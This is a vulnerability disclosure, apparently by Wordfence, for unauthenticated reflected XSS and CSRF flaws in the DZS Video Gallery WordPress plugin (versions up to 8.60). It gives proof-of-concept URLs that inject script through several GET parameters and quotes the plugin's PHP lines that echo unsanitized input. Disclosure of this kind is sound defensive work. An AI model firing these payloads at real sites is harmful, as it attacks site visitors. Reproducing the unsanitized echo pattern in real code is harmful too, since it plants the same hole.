* Discovery Date: 01.05.2016
* Public Disclosure Date:03.09.2016
* Vendor Homepage: http://digitalzoomstudio.net/
* Exploit Author: Colette Chamberland (Wordfence)
* Contact: colette@wordfence.com
* Version: <=8.60
* OVE-20160305-2497
 
 
Technical details:
 
Unauthenticated CSRF & XSS
POC:
http://[target]/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642%27%3balert%281%29%2f%2f645
Line 13-15 (unsanitized input):
 if(isset($_GET[&#039;initer&#039;])){
            $initer = $_GET[&#039;initer&#039;];
        }
Line 27 (unsanitized output):
       <?php echo "var initer = &#039;" . $initer . "&#039;;"; ?>
---------------------------------------       
Unauthenticated CSRF &  XSS
POC:
http://[target]/wp-content/plugins/dzs-videogallery/admin/tagseditor/popup.php?initer=whatava18642%27%3balert%281%29%2f%2f645
 
Line 13-15 (unsanitized input):
 if(isset($_GET[&#039;initer&#039;])){
            $initer = $_GET[&#039;initer&#039;];
        }
Line 27 (unsanitized output):
       <?php echo "var initer = &#039;" . $initer . "&#039;;"; ?>
--------------------------------------- 
Unauthenticated CSRF & XSS:
POC(s):
http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f"><script>alert(1)<%2fscript>894ba&type=&width=
http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=7934f"><script>alert(1)<%2fscript>99085&width=
http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=&width=54fd7"><script>alert(1)<%2fscript>4708b
 
Line 25 & 35 (unsanitized input & direct output):
$w =  $_GET[&#039;width&#039;];
<param name="flashvars" value="video=&#039; . $_GET[&#039;source&#039;] . &#039;&types=&#039; . $_GET[&#039;type&#039;] . &#039;&defaultQuality=hd" width="&#039; . $w . &#039;" height="&#039; . $h . &#039;">&#039;.$backup.&#039;

